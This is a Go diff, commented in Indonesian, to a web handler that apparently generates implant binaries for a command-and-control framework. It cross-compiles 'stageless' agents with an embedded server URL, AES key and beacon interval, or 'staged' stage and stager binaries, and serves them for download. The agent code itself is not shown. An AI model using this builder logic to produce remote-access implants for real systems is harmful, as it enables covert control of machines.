@@ -46,35 +46,72 @@ func BuildAgentHandler(w http.ResponseWriter, r *http.Request) {
 		outputName += ".exe"
 	}
 
-	// Argumen untuk go build
-	cmdArgs := []string{"build", "-o", outputName}
-
-	// “Stageless” => param di-embed via -ldflags
 	if buildType == "stageless" {
+		//
+		// === STAGELESS ===
+		//
+		// 1) Susun argumen build agent_stageless dengan ldflags
+		//
 		ldFlags := fmt.Sprintf("-X main.defaultServerURL=%s -X main.defaultKey=%s -X main.defaultInterval=%s",
 			serverURL, aesKey, interval,
 		)
-		cmdArgs = append(cmdArgs, "-ldflags", ldFlags)
-		// GANTI path jadi "../agent_stageless" (relative ke server/handlers)
-		cmdArgs = append(cmdArgs, "./agent_stageless")
+		cmdArgs := []string{
+			"build",
+			"-o", outputName,
+			"-ldflags", ldFlags,
+			"./agent_stageless", // Sesuaikan path
+		}
+
+		cmd := exec.Command("go", cmdArgs...)
+		cmd.Env = append(os.Environ(),
+			"GOOS="+osTarget,
+			"GOARCH="+arch,
+		)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			msg := fmt.Sprintf("Failed to build stageless agent:\n%s\nError: %v", output, err)
+			http.Error(w, msg, http.StatusInternalServerError)
+			return
+		}
+
 	} else {
-		// “staged”: compile stager.go di folder ../agent_staged
-		cmdArgs = append(cmdArgs, "./agent_staged/stager.go")
+		//
+		// === STAGED ===
+		//
+		// 1) Build stage.go -> stage.bin
+		//
+		stageOutputName := "stage.bin"
+		stageArgs := []string{"build", "-o", stageOutputName, "./agent_staged/stage/stage.go"}
+		stageCmd := exec.Command("go", stageArgs...)
+		stageCmd.Env = append(os.Environ(),
+			"GOOS="+osTarget,
+			"GOARCH="+arch,
+		)
+		stageOut, errStage := stageCmd.CombinedOutput()
+		if errStage != nil {
+			msg := fmt.Sprintf("Failed to build stage:\n%s\nError: %v", stageOut, errStage)
+			http.Error(w, msg, http.StatusInternalServerError)
+			return
+		}
+
+		//
+		// 2) Build stager.go -> stager.exe (atau stager.bin)
+		//
+		stagerArgs := []string{"build", "-o", outputName, "./agent_staged/stager/stager.go"}
+		stagerCmd := exec.Command("go", stagerArgs...)
+		stagerCmd.Env = append(os.Environ(),
+			"GOOS="+osTarget,
+			"GOARCH="+arch,
+		)
+		stagerOut, errStager := stagerCmd.CombinedOutput()
+		if errStager != nil {
+			msg := fmt.Sprintf("Failed to build stager:\n%s\nError: %v", stagerOut, errStager)
+			http.Error(w, msg, http.StatusInternalServerError)
+			return
+		}
 	}
 
-	cmd := exec.Command("go", cmdArgs...)
-	cmd.Env = os.Environ()
-	cmd.Env = append(cmd.Env, "GOOS="+osTarget, "GOARCH="+arch)
-	// cmd.Env = append(cmd.Env, "CGO_ENABLED=0") // optional
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		msg := fmt.Sprintf("Failed to build agent:\n%s\nError: %v", output, err)
-		http.Error(w, msg, http.StatusInternalServerError)
-		return
-	}
-
-	// Pastikan browser menamai file dengan outputName
+	// === Sukses build ===
 	w.Header().Set("Content-Disposition", "attachment; filename="+outputName)
 	http.ServeFile(w, r, outputName)
 }
